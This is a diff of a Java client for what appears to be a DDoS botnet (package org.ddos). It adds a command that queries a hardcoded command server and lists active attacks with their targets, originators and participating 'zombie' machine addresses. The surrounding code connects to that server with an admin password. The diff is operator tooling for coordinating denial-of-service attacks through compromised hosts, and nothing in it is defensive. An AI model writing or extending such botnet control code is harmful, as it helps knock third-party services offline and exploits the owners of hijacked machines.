@@ -17,8 +17,10 @@ import org.ddos.client.DOS;
 import org.ddos.client.Exceptions;
 import org.ddos.network.ClientNetwork;
 import org.ddos.updater.Updater;
+import org.ddos.util.ActiveAttack;
 import org.ddos.util.Computer;
 import org.ddos.util.Console;
+import org.ddos.util.Status;
 import org.jcom.Command;
 import org.jcom.CommandException;
 import org.jcom.CommandInterruptedException;
@@ -451,7 +453,7 @@ public class CommandActions {
 				}
 				try {
 					ClientNetwork.setClient(new Connection("server2.jacobsrandomsite.com", 25565));
-					
+
 					while (true) {
 						System.out.print("Enter the admin password: ");
 						String password = Console.input.nextLine();
@@ -497,12 +499,48 @@ public class CommandActions {
 						return null;
 					}
 				} else {
-					System.out.println("Cannot disconnect; not connected in the first place.");
+					System.out.println("Cannot disconnect: not connected in the first place.");
 					return null;
 				}
 
 				System.out.println("Disconnected from server.");
+				return null;
+			}
+		};
+	}
 
+	public static CommandJob getStatusAction() {
+		return new CommandJob() {
+			@Override
+			public Object doJob(Command command) {
+				try {
+					ClientNetwork.getClient().getOutputStream()
+							.writeObject(new DataPackage().setMessage("DDOS_STATUS"));
+
+					Status status = (Status) ((DataPackage) ClientNetwork.getClient().getInputStream().readObject())
+							.getObjects()[0];
+					if (status.getAttacks().length == 0) {
+						System.out.println("No DDoS attacks are running.");
+						return null;
+					}
+					System.out.println("All active DDoS attacks are as follows:");
+					for (ActiveAttack attack : status.getAttacks()) {
+						System.out.println("\tAttack on: " + attack.getAttackingAddress());
+						System.out.println("\t\tOriginator: " + attack.getOriginator());
+						System.out.println("\t\tAttacking Zombies:");
+						if (attack.getZombieAddresses().length == 0) {
+							System.out.println("\t\t\tNone");
+							continue;
+						}
+						for (SocketAddress zombieAddress : attack.getZombieAddresses()) {
+							System.out.println("\t\t\t" + zombieAddress.toString());
+						}
+					}
+				} catch (SocketException | NullPointerException e) {
+					Exceptions.unconnectedException();
+				} catch (Exception e) {
+					return null;
+				}
 				return null;
 			}
 		};
